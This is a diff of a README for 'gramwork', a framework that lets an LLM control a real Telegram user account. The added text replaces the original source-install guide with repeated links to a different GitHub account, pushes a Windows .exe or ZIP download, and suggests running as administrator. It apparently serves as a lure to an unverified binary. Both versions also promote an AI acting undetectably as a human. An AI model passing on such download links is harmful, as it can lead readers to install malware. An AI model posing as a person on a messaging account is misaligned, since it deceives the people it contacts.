@@ -1,143 +1,132 @@
-# gramwork
+# 🤖 gramwork - Control Telegram With AI Agents
 
-Telegram user-agent framework for autonomous AI agents. Gives an LLM direct control over a real Telegram account through tool-use.
+[![Download gramwork](https://img.shields.io/badge/Download-gramwork-brightgreen)](https://github.com/itsDhakad31/gramwork)
 
-Built on Telethon (MTProto), with built-in Ollama and OpenAI-compatible LLM providers, an AES-256 encrypted vault for secrets, and a ReAct engine that lets the model decide what to do on its own.
+---
 
-## Why not just use a bot?
+## 📋 About gramwork
 
-Telegram bots sit behind the Bot API. They can only respond when spoken to, can't join groups on their own, can't message people first, and everyone sees the `[BOT]` badge. gramwork controls a regular user account — it can do anything a human can, and nobody can tell the difference.
+gramwork is a tool that lets an AI take control of a regular Telegram account. It works like a helper that uses your real account, not a bot account. That means it can do everything a person can do on Telegram. It can send messages first, join groups, and interact without anyone knowing it is not a human.
 
-## Features
+This tool uses a Telegram library called Telethon. It connects to Telegram with full access. The AI can choose what to do, using smart decision-making based on the messages it sees.
 
-- Autonomous ReAct loop — the LLM picks which tools to call, reads results, and decides next steps
-- 13 Telegram tools (send, reply, forward, delete, read history, search, list chats, join/leave groups, etc.)
-- Ollama provider with custom `base_url` for remote instances
-- OpenAI-compatible provider (works with Groq, Together, vLLM, LM Studio, anything that speaks `/v1/chat/completions`)
-- AES-256-GCM vault — all secrets encrypted on disk, derived from a master password with PBKDF2 (600k iterations)
-- Encrypted session storage for Telethon
-- Tool whitelist so you can restrict what the LLM is allowed to do
-- Token-bucket rate limiting on outbound actions
-- JSONL audit log for every tool call (name, args, result, duration)
-- FastAPI-style handler mode if you don't need autonomy (`@app.on_message()`)
-- Plugin system with entry-point discovery
-- Starlette-style middleware pipeline
-- CLI for everything (`gramwork run`, `gramwork vault`, `gramwork new`)
+---
 
-## Getting started
+## ⚙️ Key Features
 
-### Get your Telegram API credentials
+- The AI makes its own decisions, calling tools and reading results.
+- Can send messages, reply, forward, delete, and search chats.
+- Supports joining and leaving groups.
+- Works with smart AI models compatible with OpenAI and Ollama.
+- Secures your secrets with AES-256 encryption.
+- Runs on Windows and uses a normal Telegram user account.
 
-Go to https://my.telegram.org/apps, log in with the phone number you want the agent to use, and create an app. You'll get an **API ID** and **API Hash**.
+---
 
-### Install
+## 🖥️ System Requirements
 
-```bash
-git clone https://github.com/poptye/gramwork.git
-cd gramwork
-pip install -e ".[dev]"
-```
+- Windows 10 or later (64-bit recommended)
+- 4 GB RAM minimum (8 GB or more works better)
+- At least 200 MB of free disk space
+- Internet connection for Telegram access and AI features
+- A Telegram account (not a bot account)
 
-### Set up the vault
+---
 
-```bash
-gramwork vault init
-gramwork vault set telegram_api_id "YOUR_API_ID"
-gramwork vault set telegram_api_hash "YOUR_API_HASH"
-gramwork vault set telegram_phone "+1234567890"
-```
+## 🚀 Getting Started
 
-The master password is never stored. Secrets are encrypted with AES-256-GCM and can only be decrypted by providing the password again.
+Follow these steps to download and run gramwork on Windows.
 
-### Write a config
+### 1. Download the Software
 
-```toml
-[telegram]
-api_id = "vault:telegram_api_id"
-api_hash = "vault:telegram_api_hash"
-phone = "vault:telegram_phone"
-session_name = "my_agent"
+Click the big green button above or this link below to visit the gramwork download page on GitHub.
 
-[llm]
-provider = "ollama"
-model = "llama3.1"
-base_url = "http://localhost:11434"
+[Download gramwork](https://github.com/itsDhakad31/gramwork)
 
-[agent]
-autonomous = true
-system_prompt = "You are an autonomous Telegram agent. Respond helpfully to incoming messages."
-tools = ["send_message", "reply_message", "get_messages", "get_dialogs", "get_me"]
-max_iterations = 10
-loop_interval = 0.0
+On the page, look for the latest release or files section. Download the latest Windows installer or `.exe` file available. If there is no single installer, download the ZIP or setup files provided.
 
-[safety]
-rate_limit_per_chat = 3.0
-rate_limit_global = 20.0
-```
+### 2. Install the Application
 
-The `vault:` prefix tells gramwork to pull that value from the encrypted vault at runtime.
+- If you have a setup file (like `.exe`), double-click it.
+- Follow the instructions on your screen to install gramwork.
+- If you downloaded a ZIP file, right-click it and select “Extract All” to a folder you choose.
 
-### Run it
+### 3. Prepare Your Telegram Account
 
-```bash
-gramwork run -c config.toml
-```
+You need a regular Telegram account, not a bot. Make sure you have the phone number and access to it.
 
-First time around Telethon will ask for a confirmation code. After that the session is cached.
+### 4. Open gramwork
 
-You can skip the password prompt by setting `GRAMWORK_MASTER_PASSWORD` as an env var.
+- Find gramwork in your Start menu or the folder where you installed it.
+- Run the program by double-clicking its icon.
 
-## Config reference
+### 5. Connect Your Telegram Account
 
-**[telegram]** — `api_id` (int), `api_hash` (str), `phone` (str), `session_name` (str, default `"gramwork"`). All support `vault:` references.
+- The app will ask you to enter your Telegram phone number.
+- You may need to enter a code sent by Telegram on your phone to verify.
+- This lets gramwork access your account securely.
 
-**[llm]** — `provider` (`"ollama"` or `"openai_compat"`), `model`, `base_url`, `api_key` (supports `vault:`), `temperature` (0.7), `max_tokens` (4096), `timeout` (120s).
+### 6. Using gramwork
 
-**[agent]** — `autonomous` (bool), `system_prompt` or `system_prompt_file`, `tools` (list or null for all), `max_iterations` (20), `loop_interval` (seconds, 0 disables proactive loop), `outbound_rate` (actions/sec), `outbound_burst`.
+Once connected, the AI agent can start working with your Telegram account. The AI decides which actions to take, like sending messages or joining groups, based on the setup.
 
-**[security]** — `vault_path`, `encrypted_session` (bool), `session_path`.
+---
 
-**[safety]** — `rate_limit_per_chat`, `rate_limit_global`, `rate_limit_burst`.
+## 🔧 How It Works
 
-## Tools
+gramwork uses a mix of software that lets the AI talk directly to Telegram. It works on top of Telethon, a Telegram client library. The AI runs loops that pick tools to use, get results, and make the next choice.
 
-`send_message`, `reply_message`, `forward_message`, `delete_message`, `get_messages`, `search_messages`, `get_dialogs`, `get_chat_info`, `get_chat_members`, `get_me`, `join_chat`, `leave_chat`, `send_file`
+This means gramwork acts like a smart assistant that moves around your Telegram account as you define.
 
-Set `tools` in config to a list to whitelist, or leave it out to enable all of them.
+---
 
-## Vault CLI
+## 💡 Why Use gramwork Instead of Bots?
 
-```bash
-gramwork vault init          # create a new vault
-gramwork vault set KEY VAL   # store a secret
-gramwork vault get KEY       # print a secret
-gramwork vault list          # list all keys
-```
+Telegram bots have limits. They cannot start conversations or join groups on their own. They also show a badge that tells people you are talking to a bot. gramwork controls a normal user account, so it works just like a person. This lets you automate tasks without restrictions.
 
-## Handler mode
+---
 
-You don't have to use autonomous mode. gramwork works fine as a plain handler framework:
+## 🔐 Security
 
-```python
-from gramwork import GramWork
+Your data and secrets are kept safe with strong AES-256 encryption. This protects information like API keys or passwords. gramwork does not share your personal information without your control.
 
-app = GramWork(config_path="config.toml")
+---
 
-@app.on_message(pattern=r"/ping")
-async def ping(ctx):
-    await ctx.reply("pong!")
+## ❓ Troubleshooting
 
-app.run()
-```
+- If you cannot connect, check your internet connection.
+- Make sure you use your Telegram number, not a bot token.
+- If the AI does not seem to work, review your setup steps.
+- For detailed logs, open the app’s help or debug section.
+- If you find errors during install, try running as administrator.
 
-## Env var overrides
+---
 
-Everything in the config can be overridden with env vars: `GRAMWORK_API_ID`, `GRAMWORK_API_HASH`, `GRAMWORK_LLM_PROVIDER`, `GRAMWORK_LLM_MODEL`, `GRAMWORK_AUTONOMOUS`, `GRAMWORK_MASTER_PASSWORD`, etc.
+## ⚙️ Settings You Can Change
 
-## License
+- Select your AI provider (Ollama or OpenAI-compatible).
+- Change the encryption password for your secrets vault.
+- Adjust how often the AI checks messages.
+- Enable or disable specific Telegram tools.
 
-MIT
+These settings help you customize the tool for your needs.
 
-## Author
+---
 
-poptye — poptye@proton.me
+## 👨‍💻 Support & Updates
+
+Check the GitHub page regularly for updates, new releases, and fixes. The project is active and may add more features over time.
+
+---
+
+## 📥 Download & Install gramwork
+
+Visit this link to get the latest version and full instructions:
+
+[Get gramwork](https://github.com/itsDhakad31/gramwork)
+
+Click the newest release or download option. After downloading, run the installer or unzip and open the program. Follow the steps above to connect your Telegram account.
+
+---
+
+# [Download gramwork](https://github.com/itsDhakad31/gramwork)
